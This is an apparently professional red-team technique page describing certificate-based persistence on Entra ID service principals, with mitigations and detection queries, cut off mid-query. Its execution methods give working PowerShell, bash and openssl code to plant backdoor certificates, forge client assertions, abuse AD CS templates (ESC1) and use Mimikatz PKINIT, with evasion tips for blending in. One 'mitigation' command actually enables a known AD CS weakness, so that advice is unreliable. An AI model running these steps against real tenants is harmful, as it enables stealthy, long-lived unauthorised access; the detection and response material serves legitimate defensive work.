# PERSIST-ACCT-006: Service Principal Cert/Secret Persistence

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-ACCT-006 |
| **MITRE ATT&CK v18.1** | [T1098.001 - Account Manipulation: Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001/) |
| **Tactic** | Persistence |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All (Entra ID, hybrid environments with certificate trust) |
| **Patched In** | N/A (configuration control, not a vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

### Concept
Service Principal Certificate/Secret Persistence is an advanced technique where attackers add X.509 certificates or cryptographic keys to compromised service principals (application identities in Entra ID) to maintain persistent, passwordless authentication. Unlike temporary secrets that expire or require rotation, certificates can be valid for **years** and provide authentication that bypasses user-based detection mechanisms. Service principals authenticate via client credentials grant flow using a public/private key pair—once an attacker controls the private key, they can silently authenticate as that service principal **indefinitely**. This technique is particularly powerful in hybrid environments where service principals are synchronized between on-premises Active Directory and Entra ID, or where certificates are chained to trusted Certificate Authorities (CAs).

### Attack Surface
The attack surface includes:
- **Service principal key credentials** (`keyCredentials` property in Entra ID)
- **Certificate storage in Azure Key Vault** (if the service principal has access)
- **Multi-tenant environments** where service principals are federated across organizations
- **Hybrid environments** where AD Certificate Services (AD CS) templates are misconfigured to allow rogue enrollment
- **Certificate-Based Authentication (CBA)** policies in Entra ID that trust attacker-controlled CAs

### Business Impact
**Undetectable persistence, cross-tenant lateral movement, and privilege escalation through passwordless impersonation.** Once an attacker holds a certificate for a service principal with high permissions (e.g., `Directory.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`), they can authenticate repeatedly without being logged as a "user" login. This bypasses anomalous sign-in detection, conditional access policies, and MFA enforcement. The attacker can then create additional backdoors, modify tenant policies, exfiltrate data, or escalate to Global Administrator. In the Semperis EntraGoat Scenario 6, attackers used certificate-based authentication combined with a rogue root CA to impersonate Global Administrators while satisfying MFA requirements.

### Technical Context
Certificate-based persistence typically takes **5-15 minutes** to establish (including certificate generation, key pair creation, and service principal modification). The technique generates **minimal direct alerting**—audit logs record the credential addition but may not trigger alerts if organizations don't monitor for certificate issuance. **Detection difficulty: Medium to Hard** (certificates can be self-signed; X.509 validation requires inspecting certificate metadata, issuer CN, and validity dates). The attack chain often follows privilege escalation: attacker compromises a user with app registration permissions → escalates to Global Admin or Application Administrator → adds certificate credential to existing high-permission service principal → uses certificate for persistent authentication.

### Operational Risk
- **Execution Risk:** Low—once an attacker generates a private/public key pair, adding it to a service principal is a single API call
- **Stealth:** High—certificates are legitimate authentication material; service principals do not generate typical "user login" events
- **Reversibility:** Hard—requires forensic analysis to identify attacker-generated certificates vs. legitimate ones; removing them may break legitimate integrations

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.17 | Ensure that multi-tenant organization is not enabled; or if enabled, required organizational relationships are properly configured |
| **CIS Benchmark** | 3.2.1 | Ensure that guest user invitations are sent to a restricted domain; or guest users are disallowed to invite additional users |
| **DISA STIG** | V-222645 | The organization must enforce requirements for certificate-based authentication security. |
| **DISA STIG** | V-222684 | The application must log all certificate-based authentication attempts and accept only valid certificates. |
| **NIST 800-53** | IA-5(2) | Authentication – Cryptographic-based authentication must use mechanisms validated under FIPS 140-2 |
| **NIST 800-53** | IA-7 | Cryptographic Module Authentication – Applications must use approved cryptographic algorithms |
| **NIST 800-53** | SC-12 | Cryptographic Key Establishment and Management – Keys must have defined lifecycle and secure storage |
| **NIST 800-63B** | 4.1.2 | Out-of-Band Devices – Multi-factor authentication mechanisms must be properly validated |
| **GDPR** | Art. 32 | Security of Processing – Cryptographic keys must be encrypted at rest and in transit |
| **GDPR** | Art. 5(1)(f) | Integrity and Confidentiality – Unauthorized key usage violates data protection principles |
| **DORA** | Art. 6 | Governance of ICT third-party risk – Certificate issuance and validation must be audited |
| **DORA** | Art. 15 | Cryptographic key management – Keys must be rotated and securely stored |
| **NIS2** | Art. 21 | Cyber risk management measures – Certificate lifecycle management is a mandatory security control |
| **NIS2** | Art. 22 | Human resources security – Staff must authenticate using verified credentials |
| **ISO 27001** | A.10.1.2 | Cryptographic Controls – Keys must be generated, stored, backed up, and destroyed securely |
| **ISO 27001** | A.9.4.5 | Cryptographic key management – Key lifecycle includes generation, certification, storage, and retirement |
| **ISO 27005** | Risk scenario | Compromise of cryptographic keys enabling unauthorized authentication and persistent access |

---

## 3. TECHNICAL PREREQUISITES

### Required Privileges
- **For certificate addition:** Owner or Application Administrator role on the target service principal OR Global Administrator role
- **For certificate generation:** Ability to execute OpenSSL, PowerShell, or equivalent certificate generation tools
- **For authentication:** Access to the private key corresponding to the public certificate installed on the service principal

### Required Access
- Network access to `https://login.microsoftonline.com` (OAuth 2.0 token endpoint)
- Network access to `https://graph.microsoft.com` (Microsoft Graph API)
- Ability to execute certificate generation tools (OpenSSL, PowerShell PKI modules)
- For hybrid environments: Access to Certificate Authority management console

### Supported Versions
- **Entra ID:** All versions
- **Hybrid AD with AD CS:** Windows Server 2016-2025
- **PowerShell:** Version 5.0+ (native Windows) or PowerShell 7.x (cross-platform)
- **Azure CLI:** Version 2.50.0+
- **OpenSSL:** Version 1.1.1+ or 3.0+

### Tools
- [Microsoft.Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell) (Version 2.0+)
- [OpenSSL](https://www.openssl.org/) (Cross-platform certificate generation)
- [Azure CLI](https://learn.microsoft.com/cli/azure/install-azure-cli) (Certificate deployment)
- [Certify](https://github.com/ejbonachera/Certify) (AD CS enumeration and abuse)
- [ESC abuse tools](https://github.com/projectdiscovery/nuclei-templates) (Certificate template exploitation)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Objective:** Identify service principals without certificate credentials and verify certificate authority trust relationships.

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.ReadWrite.All", "Directory.ReadWrite.All"

# List all service principals
$servicePrincipals = Get-MgServicePrincipal -All

# Enumerate service principals with existing certificates (potential targets for additional cert injection)
foreach ($sp in $servicePrincipals) {
    $keyCredentials = Get-MgServicePrincipalKeyCredential -ServicePrincipalId $sp.Id
    
    if ($keyCredentials) {
        Write-Host "Service Principal: $($sp.DisplayName)"
        Write-Host "  AppId: $($sp.AppId)"
        Write-Host "  Certificate Count: $($keyCredentials.Count)"
        
        foreach ($cert in $keyCredentials) {
            Write-Host "    - Key ID: $($cert.KeyId)"
            Write-Host "      Start Date: $($cert.StartDateTime)"
            Write-Host "      End Date: $($cert.EndDateTime)"
            Write-Host "      Usage: Verify (Signature Verification)"
        }
    }
}

# Check for service principals with high permissions
Get-MgServicePrincipal -All | Where-Object { 
    $_.AppRoles | Where-Object { $_.Value -in @("Directory.ReadWrite.All", "RoleManagement.ReadWrite.Directory") }
} | Select-Object DisplayName, AppId, @{Name="HighRiskRoles"; Expression={$_.AppRoles.Value -join ","}}
```

**What to Look For:**
- Service principals with **existing certificates** (indicates legitimate use; best target for adding additional backdoor certificates)
- Service principals with **high-risk application permissions**
- Certificates with **far-future expiration dates** (5+ years; may be attacker-added)
- **Recently added certificate credentials** (within last 7-30 days)

### Azure CLI Reconnaissance

```bash
# List all service principals with certificate credentials
az ad sp list --output json | jq '.[] | select(.keyCredentials | length > 0) | {displayName, appId, certificateCount: (.keyCredentials | length)}'

# Get certificate details for a specific service principal
az ad sp credential list --id <service-principal-id> --output json
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Self-Signed Certificate Generation & Installation (Attacker-Controlled Key)

**Supported Versions:** All Entra ID versions; recommended for complete control

#### Step 1: Generate Self-Signed X.509 Certificate with Private Key

**Objective:** Create a certificate that only the attacker knows the private key for.

```bash
#!/bin/bash

# Generate RSA private key (4096-bit, industry standard for service principals)
openssl genrsa -out attacker-private-key.pem 4096

# Generate self-signed certificate valid for 10 years
openssl req -new -x509 -key attacker-private-key.pem -out attacker-cert.cer -days 3650 \
    -subj "/C=US/ST=California/L=San Francisco/O=ACME Corp/CN=ServicePrincipal-Automation-2024"

# Extract public key from certificate (this is what gets installed on the service principal)
openssl x509 -pubkey -noout -in attacker-cert.cer > attacker-public-key.pem

# Display certificate details (for verification)
openssl x509 -text -noout -in attacker-cert.cer

# Store private key securely (attacker keeps this)
chmod 600 attacker-private-key.pem
echo "Private key stored in: attacker-private-key.pem"
```

**Expected Output:**
```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: <random>
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=US, ST=California, L=San Francisco, O=ACME Corp, CN=ServicePrincipal-Automation-2024
        Subject: C=US, ST=California, L=San Francisco, O=ACME Corp, CN=ServicePrincipal-Automation-2024
        Not Before: Jan  9 00:00:00 2026 GMT
        Not After : Jan  8 23:59:59 2036 GMT
        Public-Key: (4096 bit, RSA)
```

**OpSec & Evasion:**
- Use **legitimate-sounding certificate CNs** (e.g., "ServicePrincipal-Automation", "PROD-Integration-Service")
- Set expiration **10 years in future** to avoid trigger-based expiration alerts
- Store the **private key in an encrypted offline location** (not on accessible servers)
- Generate certificate from a **Linux/Mac** host to avoid Windows event logging

**Troubleshooting:**
- **Error:** `openssl: command not found`
  - **Cause:** OpenSSL not installed
  - **Fix (Linux):** `apt-get install openssl` or `yum install openssl`
  - **Fix (Windows):** Download from [OpenSSL.org](https://www.openssl.org/); or use PowerShell PKI module (see Method 2)

#### Step 2: Convert Certificate to Base64 for API Submission

**Objective:** Encode the certificate in format required by Microsoft Graph API.

```bash
#!/bin/bash

# Convert certificate to base64 (required for Microsoft Graph API)
CERT_BASE64=$(cat attacker-cert.cer | base64 -w 0)

echo "Base64-Encoded Certificate:"
echo $CERT_BASE64

# Extract certificate thumbprint (used for identification)
THUMBPRINT=$(openssl x509 -in attacker-cert.cer -noout -fingerprint -sha1 | cut -d= -f2 | tr -d ':')
echo "Certificate Thumbprint: $THUMBPRINT"

# Store these values for next step
echo $CERT_BASE64 > /tmp/cert_base64.txt
echo $THUMBPRINT > /tmp/cert_thumbprint.txt
```

**Expected Output:**
```
Base64-Encoded Certificate:
MIIF...XQAw==
Certificate Thumbprint: A1B2C3D4E5F6...
```

#### Step 3: Add Certificate to Service Principal via PowerShell

**Objective:** Install the public certificate on the target service principal; attacker keeps the private key.

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.ReadWrite.All", "Directory.ReadWrite.All"

# Target service principal
$targetServicePrincipal = Get-MgServicePrincipal -Filter "displayName eq 'Target-App-Name'"

# Define certificate parameters
$keyCredentialParams = @{
    DisplayName = "PROD-Integration-Certificate-2024-Q1"  # Nondescript name
    StartDateTime = (Get-Date)
    EndDateTime = (Get-Date).AddYears(10)
    Type = "AsymmetricX509Cert"  # Specifies X.509 certificate (not password)
    Usage = "Verify"  # Certificate is used for signature verification (authentication)
    Key = [System.Text.Encoding]::UTF8.GetBytes((Get-Content "attacker-cert.cer"))  # Certificate public key
}

# Add certificate to service principal
$newKeyCredential = Add-MgServicePrincipalKey -ServicePrincipalId $targetServicePrincipal.Id @keyCredentialParams

Write-Host "Certificate Added to Service Principal!"
Write-Host "Key ID: $($newKeyCredential.KeyId)"
Write-Host "Start Date: $($newKeyCredential.StartDateTime)"
Write-Host "End Date: $($newKeyCredential.EndDateTime)"
```

**Expected Output:**
```
Certificate Added to Service Principal!
Key ID: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
Start Date: 1/9/2026 3:18:45 PM
End Date: 1/8/2036 3:18:45 PM
```

**OpSec & Evasion:**
- Use **descriptive certificate names** that blend with legitimate certificates
- **Store the private key offline** in an encrypted container
- Authenticate from a **trusted internal network** to avoid anomalous location alerts

**Troubleshooting:**
- **Error:** `Add-MgServicePrincipalKey: Insufficient privileges to complete the operation`
  - **Cause:** Compromised account lacks Application Administrator or owner role
  - **Fix:** Use Global Administrator account OR ensure account is explicitly listed as owner of the service principal

#### Step 4: Authenticate as Service Principal Using Private Key

**Objective:** Test that the certificate-based authentication works.

```bash
#!/bin/bash

# Variables
TENANT_ID="your-tenant-id"
CLIENT_ID="service-principal-app-id"
CERT_FILE="attacker-cert.cer"
KEY_FILE="attacker-private-key.pem"

# Create JWT assertion signed by the private key
# Step 1: Create JWT header and payload
HEADER='{"alg":"RS256","typ":"JWT"}'
PAYLOAD="{\"iss\":\"$CLIENT_ID\",\"sub\":\"$CLIENT_ID\",\"aud\":\"https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token\",\"iat\":$(date +%s),\"exp\":$(($(date +%s) + 3600))}"

# Base64 URL encode header and payload
HEADER_B64=$(echo -n $HEADER | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD_B64=$(echo -n $PAYLOAD | base64 | tr '+/' '-_' | tr -d '=')

# Create signature
SIGNATURE_INPUT="$HEADER_B64.$PAYLOAD_B64"
SIGNATURE=$(echo -n "$SIGNATURE_INPUT" | openssl dgst -sha256 -sign $KEY_FILE | base64 | tr '+/' '-_' | tr -d '=')

# Construct JWT
JWT="$HEADER_B64.$PAYLOAD_B64.$SIGNATURE"

echo "JWT Token (Client Assertion):"
echo $JWT

# Step 2: Exchange JWT for access token using client credentials grant
TOKEN_RESPONSE=$(curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=$CLIENT_ID" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "client_assertion_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
  -d "client_assertion=$JWT" \
  -d "grant_type=client_credentials")

echo "Token Response:"
echo $TOKEN_RESPONSE | jq '.'

# Extract and use access token
ACCESS_TOKEN=$(echo $TOKEN_RESPONSE | jq -r '.access_token')

# Test Graph API access
curl -s -X GET "https://graph.microsoft.com/v1.0/users?$top=5" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'
```

**Expected Output:**
```json
{
  "token_type": "Bearer",
  "expires_in": 3600,
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ijl..."
}
```

**What This Means:**
- Token acquisition confirms certificate-based authentication is functional
- The service principal can now access Graph API resources based on its assigned permissions
- Attacker can authenticate **repeatedly** using the private key without any time limit

---

### METHOD 2: PowerShell PKI Module with Self-Signed Certificate (Windows Native)

**Supported Versions:** Windows Server 2016-2025 with PSPKI module; Entra ID hybrid environments

#### Step 1: Generate Certificate Using Windows PKI Module

**Objective:** Create certificate on Windows without external tools.

```powershell
# Import PKI module
Import-Module PKI

# Create self-signed certificate
$certParams = @{
    Subject = "CN=PROD-Integration-Service-2024"
    KeyAlgorithm = "RSA"
    KeyLength = 4096
    HashAlgorithm = "SHA256"
    NotAfter = (Get-Date).AddYears(10)
    CertStoreLocation = "Cert:\CurrentUser\My"
    Type = "CodeSigningCert"
}

$cert = New-SelfSignedCertificate @certParams

Write-Host "Certificate created with thumbprint: $($cert.Thumbprint)"
Write-Host "Subject: $($cert.Subject)"
```

**Expected Output:**
```
Certificate created with thumbprint: A1B2C3D4E5F6G7H8I9J0...
Subject: CN=PROD-Integration-Service-2024
```

#### Step 2: Export Private Key and Public Certificate

**Objective:** Extract certificate and private key for installation.

```powershell
# Get certificate from store
$cert = Get-ChildItem -Path "Cert:\CurrentUser\My" | Where-Object { $_.Thumbprint -eq "A1B2C3D4E5F6..." }

# Export private key to PFX file
$pfxPassword = ConvertTo-SecureString -String "YourStrongPassword" -AsPlainText -Force
Export-PfxCertificate -Cert $cert -FilePath "C:\Temp\cert-with-key.pfx" -Password $pfxPassword

# Export public certificate (for Graph API)
Export-Certificate -Cert $cert -FilePath "C:\Temp\cert-public-only.cer"

# Convert to base64 for API submission
$certBase64 = [System.Convert]::ToBase64String((Get-Content "C:\Temp\cert-public-only.cer" -Encoding Byte))
$certBase64 | Out-File "C:\Temp\cert-base64.txt"

Write-Host "Certificate exported successfully"
```

#### Step 3: Add Certificate to Service Principal

**Objective:** Register the public certificate on the target service principal.

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# Get target service principal
$servicePrincipal = Get-MgServicePrincipal -Filter "displayName eq 'Target-Application'"

# Read certificate in binary format
$certBytes = Get-Content "C:\Temp\cert-public-only.cer" -Encoding Byte

# Add key credential to service principal
$keyCredential = @{
    DisplayName = "PROD-Cert-Backdoor-Q1-2024"
    StartDateTime = (Get-Date)
    EndDateTime = (Get-Date).AddYears(10)
    Type = "AsymmetricX509Cert"
    Usage = "Verify"
    Key = $certBytes
}

Add-MgServicePrincipalKey -ServicePrincipalId $servicePrincipal.Id -KeyCredential $keyCredential

Write-Host "Certificate successfully added to service principal"
```

---

### METHOD 3: Leveraging Existing Certificates from AD CS (Hybrid Environments)

**Supported Versions:** Hybrid AD with Certificate Services; applicable to on-premises escalation + cloud backdoor

#### Step 1: Enumerate AD CS and Identify Vulnerable Templates

**Objective:** Find misconfigured certificate templates that allow arbitrary user/computer enrollment.

```powershell
# Import Active Directory module
Import-Module ActiveDirectory

# Get all certificate templates
$templates = certutil -CATemplates | Select-String ":" | ForEach-Object {
    $_.Line.Split(":")[0].Trim()
}

foreach ($template in $templates) {
    # Check template permissions
    certutil -dstemplate -v $template | Select-String "Enrollment rights" -A 5
    
    # Look for templates that allow "Domain Users" or "Authenticated Users" enrollment
    if ($_ -match "Domain Users|Authenticated Users|Everyone") {
        Write-Host "VULNERABLE TEMPLATE: $template - Allows unrestricted enrollment"
    }
}
```

#### Step 2: Enroll for Certificate with Escalated Rights (ESC1)

**Objective:** Request a certificate for a privileged account using a misconfigured template.

```powershell
# Request certificate as low-privileged user for a Global Admin
# This is the ESC1 attack (Certificate template abuse)

$certRequest = @{
    Template = "VulnerableTemplate"  # Found in Step 1
    SubjectName = "CN=GlobalAdmin@contoso.com"  # Impersonate Global Admin
    Exportable = $true
    SignatureAlgorithm = "SHA256"
}

# Use Certify tool or Mimikatz to request certificate
# Command example (using Certify):
# .\Certify.exe request /ca:ca.contoso.com /template:VulnerableTemplate /subjectaltname:GlobalAdmin@contoso.com

# Alternatively, use certreq command
$request = @"
[NewRequest]
Subject = "CN=GlobalAdmin@contoso.com"
MachineKeySet = FALSE
Exportable = TRUE
KeyLength = 4096
KeySpec = Signature
"@

$request | Out-File cert_request.inf
certreq.exe -new cert_request.inf cert_request.csr

# Submit request to CA
certreq.exe -submit -attrib "CertificateTemplate:VulnerableTemplate" cert_request.csr response.cer
```

#### Step 3: Use Certificate for Kerberos Authentication (PKINIT)

**Objective:** Authenticate to on-premises AD using the escalated certificate.

```powershell
# Convert certificate to PFX for authentication
# pfx file contains both public cert and private key

# Use PKINIT to authenticate as the impersonated admin
$certPath = "C:\Temp\admin-cert.pfx"
$certPassword = ConvertTo-SecureString "password" -AsPlainText -Force

# Create credential using certificate
$pfxCert = Get-PfxCertificate -FilePath $certPath -Password $certPassword

# Authenticate to Kerberos
# This can be done via MIMIKATZ or direct PKINIT support:
# mimikatz # kerberos::pkinit /pfx:C:\Temp\admin-cert.pfx /password:password /user:GlobalAdmin@contoso.com /domain:contoso.com

# Obtain TGT (Ticket Granting Ticket) for the impersonated admin
# This TGT can be used to request service tickets and access resources
```

#### Step 4: Bridge to Entra ID (Hybrid Environment)

**Objective:** Use on-premises escalation to compromise cloud identity.

```powershell
# Once authenticated as Global Admin on-premises, use Azure AD Connect or hybrid identity sync to escalate to cloud
# OR directly add credentials to Azure AD Connect service account (if accessible)

# Get Azure AD Connect service account
$aadConnectAccount = Get-ADUser -Filter "Name -like '*ADSync*'" -Property PasswordLastSet

# If account is compromised, extract its DPAPI-encrypted password from registry
# Then use to authenticate to Azure AD and modify directory sync settings
```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1.1: Implement Certificate Pinning and Validation Policies**

Restrict which certificates are trusted for service principal authentication by implementing strict validation policies.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Enterprise Applications**
2. Select target service principal → **Manage** → **Certificate & Secrets**
3. Review **Key Credentials** section
4. For each certificate:
   - Verify **Issuer** matches expected CA (e.g., Microsoft, DigiCert)
   - Verify **Subject** matches expected service principal
   - Check **Expiration Date** is reasonable (1-2 years for legitimate certs; 5+ years is suspicious)
   - **Delete any certificates** with suspicious issuers or extended validity
5. Click **Delete** next to suspicious certificates

**PowerShell Validation:**
```powershell
# Audit all service principal certificates
$suspiciousCerts = @()

$servicePrincipals = Get-MgServicePrincipal -All

foreach ($sp in $servicePrincipals) {
    $keyCredentials = Get-MgServicePrincipalKeyCredential -ServicePrincipalId $sp.Id
    
    foreach ($cert in $keyCredentials) {
        $certAge = (Get-Date) - $cert.StartDateTime
        $yearsUntilExpire = ($cert.EndDateTime - (Get-Date)).Days / 365
        
        # Flag suspicious certificates
        if ($yearsUntilExpire -gt 8 -or $cert.DisplayName -match "Backdoor|Attacker|Persistence") {
            $suspiciousCerts += [PSCustomObject]@{
                ServicePrincipal = $sp.DisplayName
                CertificateName = $cert.DisplayName
                StartDate = $cert.StartDateTime
                EndDate = $cert.EndDateTime
                YearsValid = $yearsUntilExpire
                Suspicious = $true
            }
        }
    }
}

# Export suspicious certificates for review
$suspiciousCerts | Export-Csv -Path "C:\Reports\SuspiciousCertificates.csv"

# Remove suspicious certificates
foreach ($suspCert in $suspiciousCerts) {
    $sp = Get-MgServicePrincipal -Filter "displayName eq '$($suspCert.ServicePrincipal)'"
    Remove-MgServicePrincipalKey -ServicePrincipalId $sp.Id -KeyCredentialId $suspCert.KeyId
    Write-Host "Removed suspicious certificate: $($suspCert.CertificateName)"
}
```

---

**Mitigation 1.2: Enforce Certificate Lifecycle Management**

Implement automatic certificate rotation policies to limit the duration of any compromised key.

**Manual Steps (Azure Policy):**
1. **Azure Portal** → **Policy** → **Definitions** → **+ Policy Definition**
2. **Name:** `Enforce Service Principal Certificate Expiration < 2 Years`
3. **Rule:**
   ```kusto
   resources
   | where type == "Microsoft.Authorization/roleDefinitions"
   | where properties.keyCredentials | length > 0
   | where properties.keyCredentials[].endDateTime > addyears(now(), 2)
   | project violating_resource = id
   ```
4. **Effect:** Deny or Audit
5. Assign to all subscriptions/tenants

**PowerShell Rotation Script:**
```powershell
# Schedule this script via Azure Automation or scheduled task

# Connect to Graph
Connect-MgGraph -Identity

# Find certificates expiring > 2 years from now or already expired
$servicePrincipals = Get-MgServicePrincipal -All

foreach ($sp in $servicePrincipals) {
    $keyCredentials = Get-MgServicePrincipalKeyCredential -ServicePrincipalId $sp.Id
    
    foreach ($cert in $keyCredentials) {
        $daysUntilExpire = ($cert.EndDateTime - (Get-Date)).Days
        
        # If certificate expires in > 2 years, schedule rotation notification
        if ($daysUntilExpire -gt 730) {
            Write-Host "ALERT: Service Principal $($sp.DisplayName) has certificate valid for $daysUntilExpire days (limit: 730)"
            # Send email alert to admin
            Send-MgUserMail -UserId "<admin@tenant.onmicrosoft.com>" -Message @{...}
        }
    }
}
```

**Validation Command (Verify Fix):**
```powershell
# Check that all certificates have < 2 year validity
Get-MgServicePrincipal -All | ForEach-Object {
    $sp = $_
    $keyCredentials = Get-MgServicePrincipalKeyCredential -ServicePrincipalId $sp.Id
    
    foreach ($cert in $keyCredentials) {
        $daysValid = ($cert.EndDateTime - $cert.StartDateTime).Days
        if ($daysValid -gt 730) {
            Write-Host "WARNING: $($sp.DisplayName) has certificate valid for $daysValid days"
        }
    }
}
```

---

**Mitigation 1.3: Monitor and Alert on Certificate Additions**

Detect when certificates are added to service principals (potential backdoor creation).

**Manual Steps (Microsoft Sentinel KQL Query):**
```kusto
// Detect new service principal certificates with verification usage
AuditLogs
| where OperationName has_any ("Add service principal key", "Add application key", "Update application - Certificates and secrets management")
| where Result =~ "success"
| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)
| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)
| extend TargetResourceName = tostring(TargetResources[0].displayName)
| extend ModifiedProperties = TargetResources[0].modifiedProperties
| mv-apply Property = ModifiedProperties on (
    where Property.displayName =~ "KeyDescription"
    | extend newValue = parse_json(tostring(Property.newValue))
    | extend keyType = tostring(newValue[0].KeyType)
    | where keyType =~ "AsymmetricX509Cert"
)
| project TimeGenerated, OperationName, InitiatingUserPrincipalName, InitiatingAppName, TargetResourceName, keyType
| where TimeGenerated > ago(24h)
```

Deploy this query as an alert rule with **1-hour frequency** and **Medium severity**.

---

### Priority 2: HIGH

**Mitigation 2.1: Restrict Certificate Authority Access**

In hybrid environments, lock down AD CS access to prevent unauthorized certificate issuance.

**Manual Steps (AD CS Certificate Authority):**
1. Open **Certification Authority** management console (certsrv.msc)
2. Right-click **CA Name** → **Properties**
3. **Certificate Managers** tab:
   - Remove unnecessary users/groups
   - Ensure only authorized admins can issue certificates
4. **Security** tab:
   - Verify only Admins have "Issue and Manage Certificates" permission
   - Remove "Everyone" or "Authenticated Users" if present

**PowerShell:**
```powershell
# Audit certificate issuance permissions
certutil -caacls -d

# Remove dangerous template enrollment rights
dsacls "CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=com" `
    /R "CONTOSO\Domain Users"  # Remove Domain Users enrollment right

# Set to require admin approval for sensitive templates
certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

---

**Mitigation 2.2: Enable Certificate Transparency Logging**

Log all certificate issuance events for forensic analysis.

**Manual Steps (Azure Audit Logging):**
1. Navigate to **Microsoft Purview Compliance Portal** → **Audit** → **Search**
2. Configure alerts for:
   - **Operations:** `Add service principal key`, `Update application - Certificates and secrets management`
   - **Result:** Success
   - **Trigger:** > 1 event in 24 hours
3. Create **Email Alert** to notify security team

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Audit Events:**
- Operation: `Add service principal key` OR `Update application - Certificates and secrets management`
- Key Type: `AsymmetricX509Cert` (indicates certificate-based credential)
- Usage: `Verify` (indicates authentication certificate, not encryption)

**Suspicious Patterns:**
- Certificates added by **non-owner accounts** (e.g., Global Admin adding cert to someone else's app)
- Certificates with **self-signed issuers** (CN field does not match Microsoft or known CA)
- Certificates with **unusually long validity** (5-10 years; legitimate certs typically 1-2 years)
- Certificates added to **high-permission service principals** (e.g., apps with `Directory.ReadWrite.All`)
- **Multiple certificates** added to the same service principal within short time window

---

### Forensic Artifacts

**Cloud Artifacts (Azure Audit Logs):**
```json
{
  "CreationTime": "2026-01-09T14:32:45Z",
  "UserPrincipalName": "attacker@contoso.com",
  "OperationName": "Add service principal key",
  "ResourceId": "/applications/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
  "TargetResources": [
    {
      "id": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
      "displayName": "Target-App",
      "modifiedProperties": [
        {
          "displayName": "KeyDescription",
          "newValue": "[{\"KeyIdentifier\":\"...\",\"KeyType\":\"AsymmetricX509Cert\",\"KeyUsage\":\"Verify\",\"DisplayName\":\"PROD-Cert-2024\"}]"
        }
      ]
    }
  ]
}
```

**Certificate Store (Windows):**
- Location: `Cert:\CurrentUser\My` or `Cert:\LocalMachine\My`
- Search for certificates with:
  - **Subject CN** matching attacker's chosen name
  - **Issuer CN** that is self-signed or non-standard
  - **Thumbprint** matching entries in audit logs

**Entra ID (Graph API):**
```powershell
# Export all service principal certificates for forensic analysis
$servicePrincipals = Get-MgServicePrincipal -All

foreach ($sp in $servicePrincipals) {
    $certificates = Get-MgServicePrincipalKeyCredential -ServicePrincipalId $sp.Id
    
    if ($certificates) {
        $certificates | Export-Csv -Path "C:\Forensics\ServicePrincipalCerts_$($sp.Id).csv" -Append
    }
}
```

---

### Response Procedures

#### 1. Isolate Compromised Service Principal

**Objective:** Immediately disable the service principal to revoke authentication capability.

```powershell
# Disable the service principal
$servicePrincipal = Get-MgServicePrincipal -Filter "appId eq 'ffffffff-gggg-hhhh-iiii-jjjjjjjjjjjj'"

Update-MgServicePrincipal -ServicePrincipalId $servicePrincipal.Id -AccountEnabled:$false

Write-Host "Service principal disabled. No further authentication possible."
```

---

#### 2. Remove All Suspicious Certificates

**Objective:** Delete attacker-added certificates while preserving legitimate ones.

```powershell
# Get compromised service principal
$servicePrincipal = Get-MgServicePrincipal -Filter "displayName eq 'Compromised-App'"

# Get all certificate credentials
$allCerts = Get-MgServicePrincipalKeyCredential -ServicePrincipalId $servicePrincipal.Id

foreach ($cert in $allCerts) {
    # Criteria for removal
    $isSuspicious = (
        $cert.DisplayName -match "Backdoor|Persistence|Attacker" -or
        ($cert.EndDateTime - $cert.StartDateTime).Days -gt 1825  # > 5 years
    )
    
    if ($isSuspicious) {
        Remove-MgServicePrincipalKey -ServicePrincipalId $servicePrincipal.Id -KeyCredentialId $cert.KeyId
        Write-Host "Removed certificate: $($cert.DisplayName)"
    }
}
```

---

#### 3. Invalidate Attacker-Held Tokens

**Objective:** Revoke any access tokens issued using the compromised certificate.

```powershell
# Sign out all sessions for the service principal
# This forces re-authentication, invalidating cached tokens

Invoke-MgGraphRequest -Method POST -Uri "/beta/serviceprincipals/$($servicePrincipal.Id)/revokeSignInSessions"

Write-Host "All tokens for service principal have been revoked."
```

---

#### 4. Hunt for Lateral Movement

**Objective:** Determine what resources the compromised service principal accessed.

```powershell
# Query Microsoft Sentinel for all Graph API calls from the compromised service principal
$query = @"
SigninLogs
| where AppId == 'ffffffff-gggg-hhhh-iiii-jjjjjjjjjjjj'  # Compromised app ID
